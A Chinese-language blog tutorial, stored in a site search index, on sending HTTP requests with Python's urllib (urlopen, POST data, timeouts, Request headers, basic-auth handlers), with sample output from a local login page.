<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>基本库的使用</title>
      <link href="/2020/04/18/%E5%9F%BA%E6%9C%AC%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/04/18/%E5%9F%BA%E6%9C%AC%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="学习爬虫"><a href="#学习爬虫" class="headerlink" title="学习爬虫"></a>学习爬虫</h2><p>学习爬虫最初的操作就是模拟浏览器向服务器发出请求，python的提供了功能齐全的类库来帮助我们完成这些请求。<code>最基础的HTTP库有urlib、httplib2、requests、treq</code>等。</p><h2 id="3-1使用urlib"><a href="#3-1使用urlib" class="headerlink" title="3.1使用urlib"></a>3.1使用urlib</h2><p>在<code>python2</code>中，有<code>urllib</code>和<code>urllib2</code>两个库来实现请求的发送。而在<code>python3</code>,已经不存在<code>urllib2</code>这个库了，统一使用<code>urllib</code>。它是<code>pyhon</code>内置的<code>http</code>请求库，包含了如下4个模块。</p><p>requests:  <strong>它是最基本的http请求模块，可以用来模拟请求，就像在浏览器里输入网址然后回车一样，只需要给库方法传入url以及而外的参数就可以模拟这个过程。</strong></p><p>error：<strong>异常处理模块，如果这个请求错误，我们就可以捕获这些异常，然后进行重试或其他操作以保证不会意外终止。</strong></p><p>parse：<strong>一个工具模块，提供了很多url处理方法，比如拆分、解析、合并等。</strong></p><p>robotparser: <strong>主要是用来识别网站的robots.txt文件，然后判断哪些网站可以爬，哪些网站不可以爬，它其实使用较少。</strong></p><p><strong>发送请求</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">urlopen: **发送请求**</span><br><span class="line"></span><br><span class="line">urllib.request: **打开和浏览url中内容** </span><br><span class="line"></span><br><span class="line">read() : 返回网页的内容</span><br></pre></td></tr></table></figure><p><code>decode()</code> :方法以 <code>encoding</code> 指定的编码格式解码字符串。默认编码为字符串编码。<br>下面我们以python官网为例子，我们来把网页抓下来,得到源代码之后呢？我们想要的链接、图片地址、文本信息不就都可以提取出来了吗？<br><strong>代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">respone = urllib.request.urlopen(<span class="string">'https://www.python.org'</span>)</span><br><span class="line"><span class="keyword">print</span>(respone.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200415091601828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="type-方法输出响应的类型"><a href="#type-方法输出响应的类型" class="headerlink" title="type()方法输出响应的类型"></a>type()方法输出响应的类型</h2><p>type() :<strong>如果你只有第一个参数则返回对象的类型，三个参数返回新的类型对象。</strong></p><p>从输出结果上得知，它是一个<code>HTTPResponse</code>类型对象，主要包含<code>read()、readinto()、getheader(name)、getheaders()、fileno()</code>等方法，以及<code>msg、version、status、reason、debuglevel、closed</code>等属性。</p><p><img src="https://img-blog.csdnimg.cn/20200415092307226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">得到这个对象后，我们把它赋值为<code>response变量</code>，然后就可以调用这些方法和属性，得到返回的一系列信息了。</p><p>例如调用<code>read()方法</code>可以得到返回的网页内容，调用<code>seatus属性</code>可以得到返回结果的状态码，<code>如200代表着请求成功，404代表着网页未找到。</code><br>可见，前两个输出分别输出了响应的状态码和响应的头信息，最后一个输出通过调用<code>getheader()方法</code>并传递一个参数<code>server获取了响应头中的server的值</code>，结果是nginx，说明服务器是用nginx搭建的。<br><strong>代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(<span class="string">'https://www.python.org'</span>)</span><br><span class="line"><span class="keyword">print</span>(response.status)</span><br><span class="line"><span class="keyword">print</span>(response.getheaders())</span><br><span class="line"><span class="keyword">print</span>(response.getheader(<span class="string">'Server'</span>))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020041509391886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">上述的例子是通过请求python的<code>get请求</code>获得python，下面使用urllib的<code>post请求</code></p><h2 id="data参数"><a href="#data参数" class="headerlink" title="data参数"></a>data参数</h2><p>data参数是可选的。如果要添加该参数，需要使用bytes()方法将参数转化为字节流编码格式的内容，即<code>bytes</code>类型。另外如果传递了这个参数，则它的请求方式就不再是<code>GET</code>方式，而是<code>POST</code>方式。<br><strong>代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">data = bytes(urllib.parse.urlencode(&#123;<span class="string">'word'</span>:<span class="string">'a'</span>&#125;),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">response = urllib.request.urlopen(<span class="string">'http://httpbin.org/post'</span>,data=data)</span><br><span class="line"><span class="keyword">print</span>(response.read())</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200415103600406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我们传递了一个参数<code>word</code>,值是<code>a</code>。他需要被转码为<code>bytes（字节流）</code>类型。其中转字节流采用了<code>bytes()</code>方法，该方法的第一个参数需要时<code>str(字符串)</code>类型，需要用<code>urllib.parse</code>模块里的<code>urlencode()</code>方法来将参数字典转化为字符串；第二个参数指定编码格式，这里指定<code>utf-8</code>。<br>这里请求的站点是httpbin.org。它可以输出请求的一些信息，其中包含我们传递的<code>data</code>参数。<br>结果如下：<br>       我们传递的参数出现了from字段，这表明模拟了表单提交的方式，以post方式传输数据。<br><img src="https://img-blog.csdnimg.cn/20200415103532688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="timeout参数"><a href="#timeout参数" class="headerlink" title="timeout参数"></a>timeout参数</h2><p><code>timeout</code>参数用于设置超时时间，单位为秒，意思就是如果请求超过了设置的这个时间，还没有得到响应就会抛出异常。如果不指定该参数，就会得到全局默认时间。它支持<code>http、https、ftp</code>请求。<br>这里我们设置超过时间0.1秒过后，服务器依然没有响应，于是抛出了URLError异常。该异常属于<code>urllib.error</code>模块，错误原因是超时。<br>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response=urllib.request.urlopen(<span class="string">'http://httpbin.org/get'</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">print</span>(response.read())</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200415125824660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">因此，可以通过设置这个超时时间来控制一个网页在长时间未响应，来跳过它的抓取。这可以利用<code>try except</code>语句来实现。代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.error</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response=urllib.request.urlopen(<span class="string">'http://httpbin.org/get'</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">except urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">if</span> isinstance(e.reason,socket.timeout):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'TIME OUT'</span>)</span><br></pre></td></tr></table></figure><p>这里我们请求了<code>http://httpbin.org/get</code>测试链接，设置超时时间是0.1秒，然后捕获了<code>URLError</code>异常，接着判断是<code>soket.timeout</code>类型（意思就是超时异常），从而得出它确实是因为超时而报错，打印输出了<code>TIME OUT。</code><br>按照常理来说，<code>0.1</code>秒内基本不可能得到服务器响应，因此输出<code>TIME OUT</code>提示，通过设置timeout这个参数来实现超时处理，有时还是挺有用的。<br><img src="https://img-blog.csdnimg.cn/20200415130531781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="request参数"><a href="#request参数" class="headerlink" title="request参数"></a>request参数</h2><p>我们知道利用<code>urlopen</code>方法可以实现最基本请求发起，但这几个简单的参数并不足以构建一个完整的请求。如果请求中需要加入Headers等信息，就可以利用更强大的<code>Request</code>类来构建。<br>首先，我们用实例来感受一下<code>request</code>的用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">request=urllib.request.Request(<span class="string">'https://python.org'</span>)</span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"><span class="keyword">print</span>(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>可以发现，我们依然是用<code>urlopen()</code>方法来发送这个请求，只不过这次该方法的参数不再是<code>URL</code>，而是一个<code>Request</code>类型的对象。通过构造这个数据结构，一方面我们可以将请求独立成一个对象，另一方面可更加丰富和灵活地配置参数。<br>下面我们看一下<code>Request</code>可以通过怎样的参数来构造，它的构造方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">urllib</span>.<span class="title">request</span>.<span class="title">Request</span><span class="params">(url, data=none, headers=&#123;&#125;, origin_req_host=none,unverifiable=False,method=none)</span></span></span><br></pre></td></tr></table></figure><p>第一个参数url用于请求<code>URL</code>，这是必传参数，其他都是可选参数。</p><p>如果要传第二个参数<code>data</code>，必须传<code>bytes（字节流）类型</code>的。如果它是字典，可以先用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p><p>第三个参数<code>headers</code>是一个字典，它就是请求头，我们可以在构造请求时通过<code>headers</code>参数直接构造，也可以通过调用请求实例的<code>add_header()</code>方法添加。</p><p>添加请求头最常用的用法就是通过修改<code>User-Agent</code>来伪装浏览器，默认的<code>User-Agent</code>是<code>Python-urllib</code>,我们可以通过修改它来伪装浏览器。比如要伪装火狐浏览器，你可以把它设置为敌：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span>(x11;U;Linux i686) Gecko/<span class="number">20071127</span> Firefox/<span class="number">2.0</span><span class="number">.0</span><span class="number">.11</span></span><br></pre></td></tr></table></figure><p>第四个参数origin_req_host指的是请求方的<code>host名称</code>或者<code>ip地址</code>。</p><p>第五个参数<code>unverifiable</code>表示这个请求是否是无法验证的，默认是<code>Falese</code>，意思就是说用户没有足够权限来选择接收这个请求结果。例如，我们请求一个<code>HTML文档</code>中的图片，但是我们没有自动抓取图像的权限，这时<code>unverifiable</code>的值是<code>true</code>。</p><p>下面我们传入多个参数来构建请求来看一下，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://httpbin.org/post'</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla(compatible;MSIE;Windows NT)'</span>,</span><br><span class="line">   <span class="string">'Host'</span>:<span class="string">'httpbin.org'</span></span><br><span class="line">&#125;</span><br><span class="line">dict=&#123;</span><br><span class="line">  <span class="string">'name'</span> : <span class="string">'Germey'</span></span><br><span class="line">&#125;</span><br><span class="line">data = bytes(parse.urlencode(dict),encoding=<span class="string">'utf8'</span>)</span><br><span class="line">req= request.Request(url=url,data=data,headers=headers,method=<span class="string">'POST'</span>)</span><br><span class="line">response = request.urlopen(req)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200415153035684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)这里我们通过4个参数构造了一个请求，其中<code>url</code>即请求<code>URL</code>，<code>headers</code>中指定了<code>User-Agent</code>和<code>Host</code>,参数<code>data</code>用<code>urlencode()</code>和<code>bytes()</code>方法转成字节流。另外，指定了请求方式为<code>POST</code>。运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20200415153058721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">观察结果可以发现，我们成功设置了<code>data</code>、<code>headers</code>和<code>method</code>。</p><p>另外，headers也可以用<code>add_header()</code>方法来添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">req = request.Request(url=url,data=data,method=<span class="string">'POST'</span>)</span><br><span class="line">req.add_header(<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5;Windows NT)'</span>)</span><br></pre></td></tr></table></figure><p>如此一来，我们就可以更加方便地构造请求，实现请求的发送啦。</p><h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><p>在上面的过程中，我们可以构造请求，但是对于一些更高级的操作（比如<code>Cookies处理、代理设置</code>等），我们该怎么办呢？<br>接下来，将需要更强大的工具Handler登场了，简而言之，我们可以把它理解为各种处理器，有专门处理登录验证的，有处理<code>Cookies</code>的，有处理设置代理的。利用他们，我们几乎可以做到<code>HTTP</code>请求中的所有事情。<br>首先介绍一下urllib.request模块里的BaseHandler类，它是所有其他Handler的父类，它提供了最基本的方法，例如<code>default_open()</code>、<code>protocol_request()</code>等。</p><p>接下来，就有各种<code>Handler</code>子类继承这个<code>BaseHandler</code>类，举例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTPDefaultErrorHandler:  用于处理HTTP响应错误，错误都会跑出HTTPError类型的异常。</span><br><span class="line"></span><br><span class="line">HTTPRedirectHandle：        用于处理重定向。</span><br><span class="line"></span><br><span class="line">HTTPCookieProcessor：     用于处理Cookies。</span><br><span class="line"></span><br><span class="line">ProxyHandler:             用于设置代理，默认代理为空。</span><br><span class="line"></span><br><span class="line">HTTPPasswordMgr:          用于管理密码，它维护了用户名和密码的表。</span><br><span class="line"></span><br><span class="line">HTTPBasicAuthHandler:    用于管理认证，如果一个链接打开时需要认证，那么可以用它来解决认证问题</span><br></pre></td></tr></table></figure><p>关于怎么使用他们，后面会有实例演示。</p><p>另一个比较重要的类就是OpenerDirector,我们可以称为Opener。我们之前用过urlopen()这个方法，实际上它就是urllib为我们提供的一个Opener。</p><p>那么为什么要引入Opener呢？因为需要实现更高级的功能。之前使用的Request和urlopen()相当于类库为你封装好了极其常用的请求方法，利用它们完成基本的请求，但是现在不一样了，我们需要实现更高级的功能，所以需要深入一层进行配置，使用更底层的实例来完成操作，所以这里就用到了Opener。</p><p>Opener可以使用open()方法，返回的类型和urlopen()如出一辙。那么，它和Handler有什么关系呢？简而言之，就是利用Handler来构建Opener。</p><p>下面用几个实例来看看他们的用法。</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a><strong>验证</strong></h2><p>有些网站在打开时就会弹出提示框，直接提示你输入用户名和密码，验证成功后才能查看页面，如下图所示。<br><img src="https://img-blog.csdnimg.cn/20200415164235473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么，如果要请求这样的页面，该怎么办呢？借助<code>HTTPBasicAuthHandler</code>就可以完成，相关代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> HTTPPasswordMgrWithDefaultRealm,HTTPBasicAuthHandler,build_opener</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"></span><br><span class="line">username=<span class="string">'username'</span></span><br><span class="line">password=<span class="string">'password'</span></span><br><span class="line">url=<span class="string">'http://127.0.0.1:8806/'</span></span><br><span class="line"></span><br><span class="line">p=HTTPPasswordMgrWithDefaultRealm()</span><br><span class="line">p.add_password(<span class="literal">None</span>,url,username,password)</span><br><span class="line">auth_handler = HTTPBasicAuthHandler(p)</span><br><span class="line">opener = build_opener(auth_handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = opener.open(url)</span><br><span class="line">    html=result.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(html)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200415165459772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)这里首先实例化<code>HTTPBasicAuthHandler</code>对象，其参数是<code>HTTPPasswordMgrWithDefaultRealm</code>对象，它利用了<code>add_password()</code>添加进行的用户名和密码，就这样建立了一个处理验证的<code>Handler</code>。<br>接下来，利用这个<code>Handler</code>并使用<code>build_opener()</code>方法构建一个<code>Opener</code>,这个<code>Opener</code>在发送请求时就相当于已经验证成功了。</p><p>接下来，利用<code>Opener的open()</code>方法打开链接，就可以完成验证了。这里获取到的结果就是验证后的页面源码内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">G:\pythonp\python.exe C:/Users/<span class="number">74292</span>/PycharmProjects/untitled7/爬取页面源码.py</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;个人中心登录&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"favicon.ico?v=2"</span> type=<span class="string">"image/x-icon"</span> /&gt;</span><br><span class="line">&lt;script src="js/jquery-2.2.4.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line"></span><br><span class="line">$(<span class="string">".form"</span>).slideDown(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#landing"</span>).addClass(<span class="string">"border-btn"</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#registered"</span>).click(function() &#123;</span><br><span class="line">$(<span class="string">"#landing"</span>).removeClass(<span class="string">"border-btn"</span>);</span><br><span class="line">$(<span class="string">"#landing-content"</span>).hide(<span class="number">500</span>);</span><br><span class="line">$(this).addClass(<span class="string">"border-btn"</span>);</span><br><span class="line">$(<span class="string">"#registered-content"</span>).show(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$(<span class="string">"#registeredtxt"</span>).click(function() &#123;</span><br><span class="line">$(<span class="string">"#landing"</span>).removeClass(<span class="string">"border-btn"</span>);</span><br><span class="line">$(<span class="string">"#landing-content"</span>).hide(<span class="number">500</span>);</span><br><span class="line">$(this).addClass(<span class="string">"border-btn"</span>);</span><br><span class="line">$(<span class="string">"#registered-content"</span>).show(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#landing"</span>).click(function() &#123;</span><br><span class="line">$(<span class="string">"#registered"</span>).removeClass(<span class="string">"border-btn"</span>);</span><br><span class="line">$(this).addClass(<span class="string">"border-btn"</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#landing-content"</span>).show(<span class="number">500</span>);</span><br><span class="line">$(<span class="string">"#registered-content"</span>).hide(<span class="number">500</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$(<span class="string">'#submitBut'</span>).click(function()&#123;</span><br><span class="line">$(<span class="string">'#team_form'</span>).submit();</span><br><span class="line">&#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">* &#123;</span><br><span class="line">margin: <span class="number">0</span>;</span><br><span class="line">padding: <span class="number">0</span>;</span><br><span class="line">font-family: <span class="string">"微软雅黑"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body &#123;</span><br><span class="line">background: <span class="comment">#F7F7F7;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.form &#123;</span><br><span class="line">position: absolute;</span><br><span class="line">top: <span class="number">50</span>%;</span><br><span class="line">left: <span class="number">50</span>%;</span><br><span class="line">margin-left: <span class="number">-185</span>px;</span><br><span class="line">margin-top: <span class="number">-210</span>px;</span><br><span class="line">height: <span class="number">420</span>px;</span><br><span class="line">width: <span class="number">340</span>px;</span><br><span class="line">font-size: <span class="number">18</span>px;</span><br><span class="line">-webkit-box-shadow: <span class="number">0</span>px <span class="number">0</span>px <span class="number">10</span>px <span class="comment">#A6A6A6;</span></span><br><span class="line">background: <span class="comment">#fff;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.border-btn &#123;</span><br><span class="line">border-bottom: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#landing,</span></span><br><span class="line"><span class="comment">#registered &#123;</span></span><br><span class="line">float: 